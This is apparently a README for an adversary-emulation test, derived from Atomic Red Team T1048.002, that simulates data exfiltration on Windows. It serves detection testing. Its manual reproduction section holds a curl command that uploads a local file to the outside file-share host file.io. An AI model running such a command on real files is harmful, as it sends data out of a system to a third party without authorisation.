# Exfiltrate data HTTPS using curl windows

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP is designed to exfiltrate HTTPS data using curl to file share site file.io.

Derived from [Atomic Red Team T1048.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.md#atomic-test-1---exfiltrate-data-https-using-curl-windows)

## Arguments
- **input_file**: a string variable specifying the path of the artifact. Default: $PWD\bin\artifact
- **curl_path**: a path variable specifying the path to curl executable. Default: C:\Windows\System32\curl.exe

## Pre-requisites
- Windows operating system equipped with powershell

## Examples
You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//exfiltration/exfiltrate-data-https/ttp.yaml
```
```bash
ttpforge run forgearmory//exfiltration/exfiltrate-data-https/ttp.yaml --arg curl_path=C:\Program\bin\curl.exe
```
```bash
ttpforge run forgearmory//exfiltration/exfiltrate-data-https/ttp.yaml --arg input_file=testArtifact
```

## Steps
1. **exfil** : Exfiltrate artifact file using curl to file share site file.io
2. **cleanup**: Removes curl if downloaded and delete files/folders created during setup

## Manual Reproduction
```bash
    #Create artifact
    "Test Text" | Out-File -FilePath "$bin\artifact"

    #Exfiltrate
    &"C:\Windows\System32\curl.exe" -F "file=@bin\artifact" -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/

```

## MITRE ATT&CK Mapping

- **Tactics**:
    - TA0010 Exfiltration
- **Techniques**:
    - T1048 Exfiltration Over Alternative Protocol
- **Subtechniques**:
    - T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
